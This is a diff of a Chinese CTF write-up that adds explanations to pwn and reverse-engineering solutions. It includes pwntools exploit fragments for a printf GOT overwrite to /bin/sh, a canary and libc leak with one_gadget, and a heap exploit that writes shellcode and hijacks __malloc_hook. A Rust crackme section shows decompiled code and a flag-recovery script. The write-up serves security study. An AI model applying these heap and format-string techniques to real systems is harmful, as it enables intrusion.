@@ -2,7 +2,7 @@
 
 ## notebook
 
-这题估计非预期魔咒又发作了，里面那一堆代码根本没用上，直接`snprintf`写`printf`的GOT表，前面放个`/bin/sh`然后后面`printf`直接就getshell了。注意不能用`%x`，因为`/bin/sh`不能带参数，只能后面加很多空格，所以要找个空字符串。
+这题估计非预期魔咒又发作了，里面那一堆代码根本没用上，直接`snprintf`写`printf`的GOT表，前面放个`/bin/sh`然后后面`printf`直接就getshell了。注意不能用`%x`，因为`/bin/sh`不能带参数，只能后面加很多空格，所以要找个空字符串。还有就是因为要判断`snprintf`结果的长度跟之前存的相等，不然不会调用`printf`，所以要把结果长度写到那个全局变量里。
 
 ```python
 from pwn import *
@@ -25,7 +25,7 @@ sh.interactive()
 
 ## babycpp
 
-`get_array`里面有溢出，先增加num再`do_unique`里面可以Leak出canary和libc（main的返回值在libc），最后`one_gadget`，清空一下栈让他条件满足
+`get_array`里面有溢出，先增加num再`do_unique`里面可以Leak出canary和libc（main的返回值在libc），因为unique函数会把元素“往前拉”，拉到20个以内就在输出的范围内了。然后具体是哪个下标是通过调试得出的。最后用那个`[rsp+0x30] == NULL`的 `one_gadget`，清空一下后面的栈让他条件满足
 
 ```python
 from pwn import *
@@ -89,7 +89,7 @@ sh.interactive()
 
 漏洞点一个UAF，一个往后溢出。
 
-首先`.bss`可写可执行，所以Unlink先拿到任意写，然后写shellcode，这是第一步。
+首先`.bss`可写可执行，所以[Unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c)先拿到任意写，然后写shellcode，这是第一步。
 
 第二步因为不能leak，所以要想好办法劫持`rip`，我最后决定是写`__malloc_hook`，因为这个全局变量就在`unsorted bin`前面一点点，所以可以用0day安全一书中的覆盖小端部分字节来绕过ASLR的思路，但是只写一个字节成功不了，因为没那么近，又不可能写3个nibble（4位），所以只能写2个字节，第四个`nibble`随便设，所以说成功率`1/16`。
 
@@ -163,16 +163,27 @@ update(0, 0x100 ,asm(shellcraft.amd64.linux.sh(), arch = 'amd64', os = 'linux'))
 create(0x68) #3
 create(0xf0) #4
 create(0x68, "A" * 0x60 + p64(0x170)) #5
+#0x170是预先放好的prev_size
 
 delete(5)
 delete(4)
+#此时Bins中有一个unsorted bin和一个0x70的fastbin
+
 update(3, 0x70 ,"A" * 0x68 + p64(0x171))
+#这里往后溢出改写unsorted bin的大小
 
 create(0xf0) #6
+#分配一个chunk，此时unsorted bin和那个0x70的fastbin重合
+#所以0x70的fastbin的fd是unsorted bin的指针
+
 update(5, 2, p16(0x8b10-3-0x20)) # 0x?b10，成功率1/16
+#把它改成__malloc_hook前面的某个地址
+#这里利用的是0x7f伪造fastbin大小的技巧，网上很多资料不详细说了
 
 create(0x60)
 create(0x60, "\x00" * 0x13 + p64(SHELL_CODE_ADDR))
+#分配两次，把__malloc_hook写成shellcode地址
+
 sh.send("1\x00")
 sh.recvuntil("Size: ")
 sh.send("1\x00")
@@ -256,21 +267,23 @@ exit()
 
 一个rust写的程序，通过特征字符串Google获得，之前也没有学过rust，也是第一次做rust逆向。
 
-动态调试看read调用时的栈帧，发现关键校验函数在`critical_A110`，其中有3个check。
+动态调试看read调用时的栈帧，发现关键校验函数在`critical_A110`，其中有3个transform。
 
 ```c
-  if ( rust_strlen(&a1) == 32 )
+  if ( rust_strlen(&a1) == 32 ) //动态调试猜得是strlen
   {
     sub_D500(&a1, v4);
     sub_D250((unsigned __int64)&v25);
     sub_10D10((rust_str *)&v25);
     sub_D250((unsigned __int64)&v23);
     v37 = 1;
-    sub_D030(&v25);
+    sub_D030(&v25); //前面这几个函数不重要
     v37 = 0;
     *(_QWORD *)v28 = *(_QWORD *)v24;
-    *(_OWORD *)v27 = *(_OWORD *)&v23;
+    *(_OWORD *)v27 = *(_OWORD *)&v23; //这个相当于浅拷贝字符串
     fst_trans((__int64)(&v25.private_2 + 1), (struct _Unwind_Exception *)v27);
+    // 第二个参数是字符串src，第一个是dst字符串，用来放transform的结果
+    // 以此类推，后面类似
     a2.length = *(_QWORD *)v26;
     *(_OWORD *)&a2.p_str = *(_OWORD *)(&v25.private_2 + 1);
     snd_trans(&v29, &a2);
@@ -296,7 +309,183 @@ exit()
 
 大概是这样，不保证完全对。
 
-然后第一个trans是打乱位置，第二个是做一些加减法，第三个是做左移右移。
+然后随便看一个trans的函数，其实都差不多，就是核心运算不一样
+
+```c
+__int64 __fastcall snd_trans(rust_str *dst, rust_str *src)
+{
+  _BYTE *v2; // rax
+  __int64 v3; // rdx
+  _BYTE *v4; // rax
+  char v5; // STFF_1
+  _BYTE *v6; // rax
+  char v7; // STB7_1
+  _BYTE *v8; // rax
+  char v9; // ST6F_1
+  _BYTE *v10; // rax
+  char v11; // ST27_1
+  unsigned __int64 v13; // [rsp+18h] [rbp-1D0h]
+  unsigned __int64 v14; // [rsp+40h] [rbp-1A8h]
+  unsigned __int64 v15; // [rsp+60h] [rbp-188h]
+  unsigned __int64 v16; // [rsp+88h] [rbp-160h]
+  unsigned __int64 v17; // [rsp+A8h] [rbp-140h]
+  unsigned __int64 v18; // [rsp+D0h] [rbp-118h]
+  unsigned __int64 v19; // [rsp+F0h] [rbp-F8h]
+  unsigned __int64 i_mul4; // [rsp+118h] [rbp-D0h]
+  unsigned __int64 v21; // [rsp+120h] [rbp-C8h]
+  __int64 v22; // [rsp+168h] [rbp-80h]
+  __int128 v23; // [rsp+170h] [rbp-78h]
+  int v24[2]; // [rsp+180h] [rbp-68h]
+  __int64 v25; // [rsp+188h] [rbp-60h]
+  __int64 v26; // [rsp+190h] [rbp-58h]
+  __int64 v27; // [rsp+198h] [rbp-50h]
+  int v28[2]; // [rsp+1A0h] [rbp-48h]
+  __int64 v29; // [rsp+1A8h] [rbp-40h]
+  __int64 v30; // [rsp+1B0h] [rbp-38h]
+  unsigned __int64 i; // [rsp+1B8h] [rbp-30h]
+  __int64 v32; // [rsp+1C0h] [rbp-28h]
+  __int128 v33; // [rsp+1C8h] [rbp-20h]
+
+  v2 = (_BYTE *)sub_DF80(32, 1);
+  *v2 = 0;
+  v2[1] = 0;
+  v2[2] = 0;
+  v2[3] = 0;
+  v2[4] = 0;
+  v2[5] = 0;
+  v2[6] = 0;
+  v2[7] = 0;
+  v2[8] = 0;
+  v2[9] = 0;
+  v2[10] = 0;
+  v2[11] = 0;
+  v2[12] = 0;
+  v2[13] = 0;
+  v2[14] = 0;
+  v2[15] = 0;
+  v2[16] = 0;
+  v2[17] = 0;
+  v2[18] = 0;
+  v2[19] = 0;
+  v2[20] = 0;
+  v2[21] = 0;
+  v2[22] = 0;
+  v2[23] = 0;
+  v2[24] = 0;
+  v2[25] = 0;
+  v2[26] = 0;
+  v2[27] = 0;
+  v2[28] = 0;
+  v2[29] = 0;
+  v2[30] = 0;
+  v2[31] = 0;
+  sub_D270((__int64)&v22, (__int64)v2, 32LL);
+  v26 = 0LL;
+  v27 = 8LL;
+  *(_QWORD *)v24 = sub_10500(0LL, 8LL);
+  v25 = v3;
+  *(_QWORD *)v28 = *(_QWORD *)v24;
+  v29 = v3;
+  while ( 1 )
+  {
+    sub_103B0(&v30, (__int64)v28);
+    if ( !v30 )
+      break;
+    if ( v30 != 1 )
+      BUG();
+    v21 = i; //i的变化范围：0-7，看起来没初始化但是应该是通过其他某个指针初始化的（可能是个结构体成员）
+      //其实不用管那么多可以调试获得到这个信息
+    i_mul4 = 4 * i;//4个一组做运算
+    if ( !is_mul_ok(4uLL, i) )
+      error((__int64)&off_27A8B0);
+    if ( i_mul4 >= 0xFFFFFFFFFFFFFFFDLL )
+      error((__int64)&off_27A900);
+      //这里还可以看到rust会检查整形溢出，有意思，不过会对速度大打折扣
+    v4 = (_BYTE *)idx_access(src, ((_BYTE)i_mul4 + 3) & 0x1F);
+      //猜+调试，发现这个函数是idx的访问
+      //所以poyoten师傅的猜题技巧是真的牛逼
+    if ( *v4 >= 0x7Fu )
+      error((__int64)&off_27A928);
+    v19 = 4 * v21;
+    if ( !is_mul_ok(4uLL, v21) )
+      error((__int64)&off_27A950);
+    if ( v19 >= 0xFFFFFFFFFFFFFFFDLL )
+      error((__int64)&off_27A9A0);
+    v5 = *v4 - 0x7F; //可以看到这是核心运算
+    *(_BYTE *)sub_10E30((__int64)&v22, ((_BYTE)v19 + 3) & 0x1F) = v5; //这里，assign到dst上
+    //.....
+    //后面和另外一个函数的分析类似，所以不说了。。。
+  }
+  v32 = v22;
+  v33 = v23;
+  dst->p_str = v22;
+  *(_OWORD *)&dst->length_not_sure = v33;//这里很明显是把结果拷贝到dst。。。
+  sub_D030((struct _Unwind_Exception *)src);
+  return (__int64)dst;
+}
+```
+
+最后分析完发现第一个trans是打乱位置，第二个是做一些加减法，第三个是做左移右移。
+
+最后那个函数是关键校验，动态调试改eflags或者改al，可以发现第一个branch能输出正确信息，然后这里有一串神秘字节序列，这里再次猜想，题目是想让我们3次transform之后得到这个序列。（感觉越来越领悟到poyoten师傅的猜题神功了
+
+```c
+void __fastcall sub_9F50(struct _Unwind_Exception *a1)
+{
+  _BYTE *v1; // rax
+  struct _Unwind_Exception v2; // [rsp+20h] [rbp-98h]
+  char v3; // [rsp+70h] [rbp-48h]
+
+  v1 = (_BYTE *)sub_DF80(32, 1);
+  *v1 = 218;
+  v1[1] = 216;
+  v1[2] = 61;
+  v1[3] = 76;
+  v1[4] = 227;
+  v1[5] = 99;
+  v1[6] = -105;
+  v1[7] = 61;
+  v1[8] = -63;
+  v1[9] = 145;
+  v1[10] = -105;
+  v1[11] = 14;
+  v1[12] = 227;
+  v1[13] = 92;
+  v1[14] = -115;
+  v1[15] = 126;
+  v1[16] = 91;
+  v1[17] = 145;
+  v1[18] = 111;
+  v1[19] = -2;
+  v1[20] = -37;
+  v1[21] = -48;
+  v1[22] = 23;
+  v1[23] = -2;
+  v1[24] = -45;
+  v1[25] = 33;
+  v1[26] = -103;
+  v1[27] = 75;
+  v1[28] = 115;
+  v1[29] = -48;
+  v1[30] = -85;
+  v1[31] = -2;
+  sub_D270((__int64)&v2, (__int64)v1, 32LL);
+  if ( sub_10E90((__int64)a1, (__int64)&v2) & 1 )
+  {
+    sub_CCF0(&v2.private_2 + 1, (__int64)&off_27B2B0, 1LL, (__int64)"wrong\n", 0LL);// correct
+    sub_16AB0(&v2.private_2 + 1);
+  }
+  else
+  {
+    sub_CCF0(&v3, (__int64)&off_27B2C0, 1LL, (__int64)"wrong\n", 0LL);
+    sub_16AB0(&v3);
+  }
+  sub_D030(&v2);
+  sub_D030(a1);
+}
+```
+
+最后逆操作脚本
 
 ```python
 def reverse_snd(src):
@@ -371,64 +560,6 @@ v1[31] = -2;
 final = map(lambda x: x % 0x100, v1)
 flag = reverse_fst(reverse_snd(reverse_trd(final)))
 print "".join(map(chr,flag))
-```
-
-最后那个函数是关键校验，改eflags可得第一个branch能输出正确信息
-
-```c
-void __fastcall sub_9F50(struct _Unwind_Exception *a1)
-{
-  _BYTE *v1; // rax
-  struct _Unwind_Exception v2; // [rsp+20h] [rbp-98h]
-  char v3; // [rsp+70h] [rbp-48h]
-
-  v1 = (_BYTE *)sub_DF80(32, 1);
-  *v1 = 218;
-  v1[1] = 216;
-  v1[2] = 61;
-  v1[3] = 76;
-  v1[4] = 227;
-  v1[5] = 99;
-  v1[6] = -105;
-  v1[7] = 61;
-  v1[8] = -63;
-  v1[9] = 145;
-  v1[10] = -105;
-  v1[11] = 14;
-  v1[12] = 227;
-  v1[13] = 92;
-  v1[14] = -115;
-  v1[15] = 126;
-  v1[16] = 91;
-  v1[17] = 145;
-  v1[18] = 111;
-  v1[19] = -2;
-  v1[20] = -37;
-  v1[21] = -48;
-  v1[22] = 23;
-  v1[23] = -2;
-  v1[24] = -45;
-  v1[25] = 33;
-  v1[26] = -103;
-  v1[27] = 75;
-  v1[28] = 115;
-  v1[29] = -48;
-  v1[30] = -85;
-  v1[31] = -2;
-  sub_D270((__int64)&v2, (__int64)v1, 32LL);
-  if ( sub_10E90((__int64)a1, (__int64)&v2) & 1 )
-  {
-    sub_CCF0(&v2.private_2 + 1, (__int64)&off_27B2B0, 1LL, (__int64)"wrong\n", 0LL);// correct
-    sub_16AB0(&v2.private_2 + 1);
-  }
-  else
-  {
-    sub_CCF0(&v3, (__int64)&off_27B2C0, 1LL, (__int64)"wrong\n", 0LL);
-    sub_16AB0(&v3);
-  }
-  sub_D030(&v2);
-  sub_D030(a1);
-}
 ```
 
 ## babymips
